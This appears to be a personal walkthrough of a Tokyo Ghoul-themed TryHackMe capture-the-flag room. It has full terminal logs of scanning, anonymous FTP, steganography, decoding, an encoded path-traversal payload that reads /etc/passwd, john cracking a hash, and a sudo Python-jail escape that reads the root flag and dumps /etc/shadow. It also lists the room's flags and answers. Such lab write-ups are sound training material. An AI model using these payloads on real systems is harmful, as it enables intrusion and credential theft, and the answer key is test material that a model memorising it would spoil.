---
Help kaneki escape jason room
---

![](https://i.pinimg.com/originals/fd/65/ff/fd65ffab480607b6ec1eb33239e690f9.png)

![222](https://tryhackme-images.s3.amazonaws.com/room-icons/796659bf2a5ae9a15bb6c948291fef4a.jpeg)


### About the room

 Start Machine

![](https://i.imgur.com/tuzTqo4.gif)   

This room took a lot of inspiration from [psychobreak](https://tryhackme.com/room/psychobreak) , and it is based on Tokyo Ghoul anime.

Alert: This room can contain some spoilers 'only s1 and s2 ' so if you are interested to watch the anime, wait till you finish the anime and come back to do the room 

The machine will take some time, just go grab some water or make a coffee.

  

**This room contains some non-pg13 elements in the form of narrative descriptions. Please proceed only at your own comfort level.** 

Answer the questions below

_Read the above_

 Completed

Deploy the machine 

 Completed

### Where am i ?

![](https://thumbs.gfycat.com/DecisiveLeadingDuck-small.gif)

  

Let's do some scanning .

Answer the questions below

```
┌──(witty㉿kali)-[~/Downloads/Rooms/gau]
└─$ rustscan -a 10.10.136.184 --ulimit 5500 -b 65535 -- -A -Pn
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Nmap? More like slowmap.🐢

[~] The config file is expected to be at "/home/witty/.rustscan.toml"
[~] Automatically increasing ulimit value to 5500.
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
Open 10.10.136.184:21
Open 10.10.136.184:22
Open 10.10.136.184:80
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
[~] Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-23 12:43 EST
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 12:43
Completed NSE at 12:43, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 12:43
Completed NSE at 12:43, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 12:43
Completed NSE at 12:43, 0.00s elapsed
Initiating Parallel DNS resolution of 1 host. at 12:43
Completed Parallel DNS resolution of 1 host. at 12:43, 13.01s elapsed
DNS resolution of 1 IPs took 13.02s. Mode: Async [#: 1, OK: 0, NX: 0, DR: 1, SF: 0, TR: 3, CN: 0]
Initiating Connect Scan at 12:43
Scanning 10.10.136.184 [3 ports]
Discovered open port 80/tcp on 10.10.136.184
Discovered open port 22/tcp on 10.10.136.184
Discovered open port 21/tcp on 10.10.136.184
Completed Connect Scan at 12:43, 0.20s elapsed (3 total ports)
Initiating Service scan at 12:43
Scanning 3 services on 10.10.136.184
Completed Service scan at 12:43, 11.61s elapsed (3 services on 1 host)
NSE: Script scanning 10.10.136.184.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 12:43
NSE: [ftp-bounce 10.10.136.184:21] PORT response: 500 Illegal PORT command.
NSE Timing: About 99.05% done; ETC: 12:44 (0:00:00 remaining)
Completed NSE at 12:44, 55.31s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 12:44
Completed NSE at 12:44, 7.93s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 12:44
Completed NSE at 12:44, 0.00s elapsed
Nmap scan report for 10.10.136.184
Host is up, received user-set (0.19s latency).
Scanned at 2023-02-23 12:43:33 EST for 76s

PORT   STATE SERVICE REASON  VERSION
21/tcp open  ftp     syn-ack vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxr-xr-x    3 ftp      ftp          4096 Jan 23  2021 need_Help?
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.8.19.103
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     syn-ack OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 fa9e38d395df55ea14c949d80a61db5e (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCeIXT46ZiVmp8Es0cKk8YkMs3kwCdmC2Ve/0A0F7aKUIOlbyLc9FkbTEGSrE69obV3u6VywjxZX6VWQoJRHLooPmZCHkYGjW+y5kfEoyeu7pqZr7oA8xgSRf+gsEETWqPnSwjTznFaZ0T1X0KfIgCidrr9pWC0c2AxC1zxNPz9p13NJH5n4RUSYCMOm2xSIwUr6ySL3v/jijwEKIMnwJHbEOmxhGrzaAXgAJeGkXUA0fU1mTVLlSwOClKOBTTo+FGcJdrFf65XenUVLaqaQGytKxR2qiCkr7bbTaWV0F8jPtVD4zOXLy2rGoozMU7jAukQu6uaDxpE7BiybhV3Ac1x
|   256 adb7a75e36cb32a090908e0b98308a97 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBC5o77nOh7/3HUQAxhtNqHX7LGDtYoVZ0au6UJzFVsAEJ644PyU2/pALbapZwFEQI3AUZ5JxjylwKzf1m+G5OJM=
|   256 a2a2c81496c5206885e541d0aa538bbd (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOJwYjN/qiwrS4es9m/LgWitFMA0f6AJMTi8aHkYj7vE
80/tcp open  http    syn-ack Apache httpd 2.4.18 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 12:44
Completed NSE at 12:44, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 12:44
Completed NSE at 12:44, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 12:44
Completed NSE at 12:44, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 90.30 seconds


┌──(witty㉿kali)-[~/Downloads/wappylyzer]
└─$ ftp 10.10.136.184
Connected to 10.10.136.184.
220 (vsFTPd 3.0.3)
Name (10.10.136.184:witty): anonymous
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||41898|)
150 Here comes the directory listing.
drwxr-xr-x    3 ftp      ftp          4096 Jan 23  2021 need_Help?
226 Directory send OK.
ftp> ls -la
229 Entering Extended Passive Mode (|||40583|)
150 Here comes the directory listing.
drwxr-xr-x    3 ftp      ftp          4096 Jan 23  2021 .
drwxr-xr-x    3 ftp      ftp          4096 Jan 23  2021 ..
drwxr-xr-x    3 ftp      ftp          4096 Jan 23  2021 need_Help?
226 Directory send OK.
ftp> more need_Help?
Failed to open file.
ftp> cd need_Help?
250 Directory successfully changed.
ftp> ls -la
229 Entering Extended Passive Mode (|||45568|)
150 Here comes the directory listing.
drwxr-xr-x    3 ftp      ftp          4096 Jan 23  2021 .
drwxr-xr-x    3 ftp      ftp          4096 Jan 23  2021 ..
-rw-r--r--    1 ftp      ftp           480 Jan 23  2021 Aogiri_tree.txt
drwxr-xr-x    2 ftp      ftp          4096 Jan 23  2021 Talk_with_me
226 Directory send OK.
ftp> more Aogiri_tree.txtt
Why are you so late?? i've been waiting for too long .
So i heard you need help to defeat Jason , so i'll help you to do it and i know 
you are wondering how i will. 
I knew Rize San more than anyone and she is a part of you, right?
That mean you got her kagune , so you should activate her Kagune and to do that 
you should get all control to your body , i'll help you to know Rise san more an
d get her kagune , and don't forget you are now a part of the Aogiri tree .
Bye Kaneki.

ftp> mget *
mget need_to_talk [anpqy?]? 
229 Entering Extended Passive Mode (|||41588|)
150 Opening BINARY mode data connection for need_to_talk (17488 bytes).
  0% |                                   |     0        0.00 KiB/s    --:-- ETA

uhmm
```


Use nmap to scan all ports 

 Completed

How many ports are open ? 

*3*

What is the OS used ?

*Ubuntu*

### Planning to escape

  

![](https://pm1.narvii.com/5731/bc5df8c79950e46f820fad03bcb98e056b03adc8_hq.jpg)

Try to look around any thing would be useful . 

Answer the questions below

```
view-source:http://10.10.136.184/jasonroom.html

<!-- look don't tell jason but we will help you escape we will give you the key to open those chains and here is some clothes to look like us and a mask to look anonymous and go to the ftp room right there -->

I see the problem I was using Cloudflare Warp 🤣

ftp> mget *
mget need_to_talk [anpqy?]? y
229 Entering Extended Passive Mode (|||45528|)
150 Opening BINARY mode data connection for need_to_talk (17488 bytes).
100% |***********************************| 17488       89.67 KiB/s    00:00 ETA
226 Transfer complete.
17488 bytes received in 00:00 (45.22 KiB/s)
mget rize_and_kaneki.jpg [anpqy?]? y
229 Entering Extended Passive Mode (|||46330|)
150 Opening BINARY mode data connection for rize_and_kaneki.jpg (46674 bytes).
100% |***********************************| 46674      120.55 KiB/s    00:00 ETA
226 Transfer complete.
46674 bytes received in 00:00 (79.52 KiB/s)

┌──(witty㉿kali)-[~/Downloads/wappylyzer]
└─$ file need_to_talk    
need_to_talk: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=adba55165982c79dd348a1b03c32d55e15e95cf6, for GNU/Linux 3.2.0, not stripped
                                                                                
┌──(witty㉿kali)-[~/Downloads/wappylyzer]
└─$ chmod +x need_to_talk 
                                                                                
┌──(witty㉿kali)-[~/Downloads/wappylyzer]
└─$ ./need_to_talk 
Hey Kaneki finnaly you want to talk 
Unfortunately before I can give you the kagune you need to give me the paraphrase
Do you have what I'm looking for?

┌──(witty㉿kali)-[~/Downloads/wappylyzer]
└─$ file rize_and_kaneki.jpg 
rize_and_kaneki.jpg: JPEG image data, JFIF standard 1.01, aspect ratio, density 1x1, segment length 16, baseline, precision 8, 1024x576, components 3

┌──(witty㉿kali)-[~/Downloads/wappylyzer]
└─$ steghide extract -sf rize_and_kaneki.jpg                                  
Enter passphrase: 
steghide: could not extract any data with that passphrase!

┌──(witty㉿kali)-[~/Downloads/wappylyzer]
└─$ strings need_to_talk                    
/lib64/ld-linux-x86-64.so.2
mgUa
puts
putchar
stdin
printf
fgets
strlen
stdout
malloc
usleep
__cxa_finalize
setbuf
strcmp
__libc_start_main
free
libc.so.6
GLIBC_2.2.5
_ITM_deregisterTMCloneTable
__gmon_start__
_ITM_registerTMCloneTable
u/UH
You_founH
d_1t
[]A\A]A^A_
kamishiro
Hey Kaneki finnaly you want to talk 
Unfortunately before I can give you the kagune you need to give me the paraphrase
Do you have what I'm looking for?
Good job. I believe this is what you came for:
Hmm. I don't think this is what I was looking for.
Take a look inside of me. rabin2 -z
;*3$"
GCC: (Debian 9.3.0-15) 9.3.0
crtstuff.c
deregister_tm_clones
__do_global_dtors_aux
completed.7452
__do_global_dtors_aux_fini_array_entry
frame_dummy
__frame_dummy_init_array_entry
need_to_talk.c
__FRAME_END__
__init_array_end
_DYNAMIC
__init_array_start
__GNU_EH_FRAME_HDR
_GLOBAL_OFFSET_TABLE_
__libc_csu_fini
free@@GLIBC_2.2.5
putchar@@GLIBC_2.2.5
print_intro
_ITM_deregisterTMCloneTable
stdout@@GLIBC_2.2.5
sleep_delay
puts@@GLIBC_2.2.5
stdin@@GLIBC_2.2.5
_edata
strlen@@GLIBC_2.2.5
setbuf@@GLIBC_2.2.5
printf@@GLIBC_2.2.5
slow_type
__libc_start_main@@GLIBC_2.2.5
fgets@@GLIBC_2.2.5
__data_start
strcmp@@GLIBC_2.2.5
__gmon_start__
__dso_handle
_IO_stdin_used
__libc_csu_init
malloc@@GLIBC_2.2.5
__bss_start
main
dialogs
check_password
print_flag
__TMC_END__
_ITM_registerTMCloneTable
__cxa_finalize@@GLIBC_2.2.5
the_password
usleep@@GLIBC_2.2.5
.symtab
.strtab
.shstrtab
.interp
.note.gnu.build-id
.note.ABI-tag
.gnu.hash
.dynsym
.dynstr
.gnu.version
.gnu.version_r
.rela.dyn
.rela.plt
.init
.plt.got
.text
.fini
.rodata
.eh_frame_hdr
.eh_frame
.init_array
.fini_array
.dynamic
.got.plt
.data
.bss
.comment

┌──(witty㉿kali)-[~/Downloads/wappylyzer]
└─$ ./need_to_talk                      
Hey Kaneki finnaly you want to talk 
Unfortunately before I can give you the kagune you need to give me the paraphrase
Do you have what I'm looking for?

> kamishiro
Good job. I believe this is what you came for:
You_found_1t

┌──(witty㉿kali)-[~/Downloads/wappylyzer]
└─$ steghide extract -sf rize_and_kaneki.jpg
Enter passphrase: 
wrote extracted data to "yougotme.txt".
                                                                                
┌──(witty㉿kali)-[~/Downloads/wappylyzer]
└─$ cat yougotme.txt     
haha you are so smart kaneki but can you talk my code 

..... .-
....- ....-
....- -....
--... ----.
....- -..
...-- ..---
....- -..
...-- ...--
....- -..
....- ---..
....- .-
...-- .....
..... ---..
...-- ..---
....- .
-.... -.-.
-.... ..---
-.... .
..... ..---
-.... -.-.
-.... ...--
-.... --...
...-- -..
...-- -..


if you can talk it allright you got my secret directory 

https://www.dcode.fr/cipher-identifier

https://www.dcode.fr/morse-code

5A4446794D324D334D484A3558324E6C626E526C63673D3D (hex)

From hexadecimal data

https://www.dcode.fr/file-data (download data.txt)

ZDFyM2M3MHJ5X2NlbnRlcg==

From base64 d1r3c70ry_center

or just use cyberchef and magic wand


```

Did you find the note that the others ghouls gave you? where did you find it ? 

just inspect

*jasonroom.html*

What is the key for Rize executable?

*kamishiro*

Use a tool to get the other note from Rize .

Touka said one time something about steg... stog? and hidding things i can't remember

 Completed

### What Rize is trying to say?

![](https://fc08.deviantart.net/fs70/f/2014/347/d/5/jason_torturing_kaneki_by_otakubishounen-d89o67a.gif)

  

You should help me , i can't support pain aghhhhhhh

Answer the questions below

```
view-source:http://10.10.136.184/d1r3c70ry_center/

<p> Scan me scan me scan all my ideas aaaaahhhhhhhh </p>

┌──(witty㉿kali)-[~/Downloads/wappylyzer]
└─$ gobuster -t 64 dir -e -k -u http://10.10.136.184/d1r3c70ry_center/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
===============================================================
Gobuster v3.4
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.136.184/d1r3c70ry_center/
[+] Method:                  GET
[+] Threads:                 64
[+] Wordlist:                /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.4
[+] Expanded:                true
[+] Timeout:                 10s
===============================================================
2023/02/23 13:22:28 Starting gobuster in directory enumeration mode
===============================================================
http://10.10.136.184/d1r3c70ry_center/claim                (Status: 301) [Size: 331] [--> http://10.10.136.184/d1r3c70ry_center/claim/]
Progress: 12307 / 220561 (5.58%)^C
[!] Keyboard interrupt detected, terminating.

===============================================================
2023/02/23 13:23:07 Finished
===============================================================

LFI

http://10.10.136.184/d1r3c70ry_center/claim/index.php?view=../

no no no silly don't do that

https://vulp3cula.gitbook.io/hackers-grimoire/exploitation/web-application/lfi-rfi
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/File%20Inclusion/README.md

just use cyberchef (I was trying lot of payloads LFI but not work)

url encode
../../../etc/passwd

%2E%2E%2F%2E%2E%2F%2E%2E%2Fetc%2Fpasswd

10.10.136.184/d1r3c70ry_center/claim/index.php?view=%2E%2E%2F%2E%2E%2F%2E%2E%2Fetc%2Fpasswd

root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false syslog:x:104:108::/home/syslog:/bin/false _apt:x:105:65534::/nonexistent:/bin/false lxd:x:106:65534::/var/lib/lxd/:/bin/false messagebus:x:107:111::/var/run/dbus:/bin/false uuidd:x:108:112::/run/uuidd:/bin/false dnsmasq:x:109:65534:dnsmasq,,,:/var/lib/misc:/bin/false statd:x:110:65534::/var/lib/nfs:/bin/false sshd:x:111:65534::/var/run/sshd:/usr/sbin/nologin vagrant:x:1000:1000:vagrant,,,:/home/vagrant:/bin/bash vboxadd:x:999:1::/var/run/vboxadd:/bin/false ftp:x:112:118:ftp daemon,,,:/srv/ftp:/bin/false kamishiro:$6$Tb/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0:1001:1001:,,,:/home/kamishiro:/bin/bash 

┌──(witty㉿kali)-[~/Downloads/wappylyzer]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt hash_tokio 
Using default input encoding: UTF-8
Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 128/128 AVX 2x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
password123      (?)     
1g 0:00:00:00 DONE (2023-02-23 13:46) 1.010g/s 1551p/s 1551c/s 1551C/s cuties..mexico1
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
                                                                                                               
┌──(witty㉿kali)-[~/Downloads/wappylyzer]
└─$ cat hash_tokio  
$6$Tb/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0


```


What the message mean did you understand it ? what it says?

encoding?encoding?encoding?encoding?encoding?encoding?encoding?encoding?encoding? cyber chef?????????????????

*d1r3c70ry_center*

Can you see the weakness in the dark ? no ? just search 

what you can't do the moon walk?


What did you find something ? crack it

 Completed

what is rize username ?

*kamishiro*

what is rize password ?

You can call john for help

*password123*

### Fight Jason

![](https://33.media.tumblr.com/cd0d4d963a4ef3564d7ca4621d3346f0/tumblr_nj23o9WFXq1u9f7vko1_500.gif)  

Finnaly i got Rize kagune help me fight Jason and get root .

Answer the questions below

```
┌──(witty㉿kali)-[~/Downloads/wappylyzer]
└─$ ssh kamishiro@10.10.136.184
kamishiro@10.10.136.184's password: 
Welcome to Ubuntu 16.04.7 LTS (GNU/Linux 4.4.0-197-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage


This system is built by the Bento project by Chef Software
More information can be found at https://github.com/chef/bento

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.


The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

Last login: Sat Jan 23 22:29:38 2021 from 192.168.77.1
kamishiro@vagrant:~$ ls
jail.py  user.txt
kamishiro@vagrant:~$ cat user.txt
e6215e25c0783eb4279693d9f073594a
kamishiro@vagrant:~$ cat jail.py 
#! /usr/bin/python3
#-*- coding:utf-8 -*-
def main():
    print("Hi! Welcome to my world kaneki")
    print("========================================================================")
    print("What ? You gonna stand like a chicken ? fight me Kaneki")
    text = input('>>> ')
    for keyword in ['eval', 'exec', 'import', 'open', 'os', 'read', 'system', 'write']:
        if keyword in text:
            print("Do you think i will let you do this ??????")
            return;
    else:
        exec(text)
        print('No Kaneki you are so dead')
if __name__ == "__main__":
    main()

https://anee.me/escaping-python-jails-849c65cf306e

kamishiro@vagrant:~$ sudo -l
[sudo] password for kamishiro: 
Matching Defaults entries for kamishiro on vagrant.vm:
    env_reset, exempt_group=sudo, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User kamishiro may run the following commands on vagrant.vm:
    (ALL) /usr/bin/python3 /home/kamishiro/jail.py

kamishiro@vagrant:~$ sudo /usr/bin/python3 /home/kamishiro/jail.py
Hi! Welcome to my world kaneki
========================================================================
What ? You gonna stand like a chicken ? fight me Kaneki
>>> __builtins__.__dict__['__IMPORT__'.lower()]('OS'.lower()).__dict__['SYSTEM'.lower()]('cat /root/root.txt')
9d790bb87898ca66f724ab05a9e6000b
No Kaneki you are so dead

kamishiro@vagrant:~$ sudo /usr/bin/python3 /home/kamishiro/jail.py
Hi! Welcome to my world kaneki
========================================================================
What ? You gonna stand like a chicken ? fight me Kaneki
>>> __builtins__.__dict__['__IMPORT__'.lower()]('OS'.lower()).__dict__['SYSTEM'.lower()]('cat /etc/shadow')
root:$6$mfVYiG2/$uNRFG6slcBUNt/mJn8YAWRk5Jf8ruvNqcX5AZSPrgoayf67SfzPm50rz5Rh/PjkLDmBOTaoUjTK9opJ.AfEdF0:18650:0:99999:7:::
daemon:*:18484:0:99999:7:::
bin:*:18484:0:99999:7:::
sys:*:18484:0:99999:7:::
sync:*:18484:0:99999:7:::
games:*:18484:0:99999:7:::
man:*:18484:0:99999:7:::
lp:*:18484:0:99999:7:::
mail:*:18484:0:99999:7:::
news:*:18484:0:99999:7:::
uucp:*:18484:0:99999:7:::
proxy:*:18484:0:99999:7:::
www-data:*:18484:0:99999:7:::
backup:*:18484:0:99999:7:::
list:*:18484:0:99999:7:::
irc:*:18484:0:99999:7:::
gnats:*:18484:0:99999:7:::
nobody:*:18484:0:99999:7:::
systemd-timesync:*:18484:0:99999:7:::
systemd-network:*:18484:0:99999:7:::
systemd-resolve:*:18484:0:99999:7:::
systemd-bus-proxy:*:18484:0:99999:7:::
syslog:*:18484:0:99999:7:::
_apt:*:18484:0:99999:7:::
lxd:*:18619:0:99999:7:::
messagebus:*:18619:0:99999:7:::
uuidd:*:18619:0:99999:7:::
dnsmasq:*:18619:0:99999:7:::
statd:*:18619:0:99999:7:::
sshd:*:18619:0:99999:7:::
vagrant:$6$WZONvj5a$N4bCyTulhXMKczW0B1e9bntdH/ch/BPKyEASlNj2W9iZg91Z/Kdh6uUaLVm2nIR/lBBQV8dbghkc5DnYnQYQn/:18619:0:99999:7:::
vboxadd:!:18619::::::
ftp:*:18650:0:99999:7:::
kamishiro:$1$S/J0bMLz$nuTXttCme9RUXFPAHyOxS1:18650:0:99999:7:::
No Kaneki you are so dead
```


user.txt

*e6215e25c0783eb4279693d9f073594a*

root.txt

*9d790bb87898ca66f724ab05a9e6000b*

### Special thanks

![](https://giffiles.alphacoders.com/132/13246.gif)  

You can contact me on my discord :  0UR4N05#6231  

  

Congratulations you've complete Tokyo ghoul room 1. This is the first room I've ever created so If you enjoyed it please give me a follow up on [twitter](https://twitter.com/0_n05) and send me your feedback  in twitter or discord , and i'll be so grateful if you like this room and share it with your friends , thank you .

Answer the questions below

Thank you

 Completed
 

[[Dependency Management]]